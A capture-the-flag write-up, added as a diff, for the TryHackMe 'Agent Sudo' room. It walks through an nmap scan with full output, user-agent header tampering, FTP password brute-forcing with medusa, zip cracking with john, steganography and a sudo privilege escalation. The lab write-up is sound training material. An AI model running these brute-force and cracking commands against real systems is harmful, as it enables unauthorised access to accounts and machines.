@@ -1,0 +1,116 @@
+This is a write up for the easy rated CTF on tryhackme.com Agent Sudo.
+
+It's a nice easy walkthrough CTF, I won't be answering questions explicitly all the time but the answers to questions like how mnay ports are open will be in the output I paste into this file.
+
+nmap -sV -sS -A 10.10.62.180
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-25 09:19 SAST
+Nmap scan report for 10.10.62.180
+Host is up (0.14s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
+|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
+|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Annoucement
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=5/25%OT=21%CT=1%CU=31257%PV=Y%DS=2%DC=T%G=Y%TM=60ACA52
+OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=A)OPS
+OS:(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST1
+OS:1NW7%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
+OS:(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+
+Network Distance: 2 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 8888/tcp)
+HOP RTT       ADDRESS
+1   153.75 ms 10.9.0.1
+2   153.70 ms 10.10.62.180
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 33.43 seconds
+
+So from the announcement on the home page of the website we can find the answer to the second question. If you're confused look at the hint and only 1 word matches the syntax.
+
+So gobuster didn't find anything so I started up burp to see what the requests were saying and there was a user-agent field. I filled it out with a letter and got onto an agents page. Eventually I tried C and got a name that we can use and is the answer to the third question.
+
+user-agent: C
+
+Attention chris,
+
+Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
+
+From,
+Agent R
+
+This is useful we know there's another Agent J and Chris has a shitty password. 
+
+Anyway off the next question we know that we are going to brute force the ftp server suing the username chris and it was successful rather quickly. I used Medusa over hydra because it's faster, but here's the command I used
+
+medusa -u chris -P /usr/share/wordlists/rockyou.txt -h 10.10.62.180 -M ftp -t 30
+
+
+
+There were 2 images and the messages to agent J 
+
+Dear agent J,
+
+All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
+
+From,
+Agent C
+
+Which means it's time for some steganography.
+
+
+Exiftool shows us some interesting things in the png
+Warning                         : [minor] Trailer data after PNG IEND chunk
+
+So I decided to use binwalk on both the files and found a .zip files contained in the .png file. I extracted it and used john to crack the password
+
+zip2john 8702.zip >hash.txt
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+And we get the password as output
+
+So we unzip the folder and enter the password to access the message and get
+
+Agent C,
+
+We need to send the picture to 'QXJlYTUx' as soon as possible!
+
+By,
+Agent R
+
+And that text looks like some base64 shenanigans so we can use 
+
+echo QXJlYTUx | base64 --decode
+	to decode it and get a passphrase 
+
+Okay. Now we finally have the passphrase that works to extract the info from the image and is written into message.txt
+
+The message gives us a name and password to ssh into their system. This is good :) now we can get the user flag.
+
+And the password gets us in and we can find the user flag. Also we need to do a reverse image search. I was too lazy to download the image and the hint mentioned fox news so i searched fox news and the names of the image and got the answer.
+
+Now time for privledge escalation.
+Running sudo -l tell us what command james can run as sudo 
+
+You can use the info from the command above to find the CVE number for the exploit to get root privledges. Then use the exploit to find the root flag at root/root.txt where it always is.
+
+and the answer to the bonux question is there too. 
+
+And we're done.
+
+Thanks for reading the write up I apologise for any typos or misspellings I don't spell check these things and I tend to be thinking about the hacking while I'm typing and not nececssarily what I am typing. 
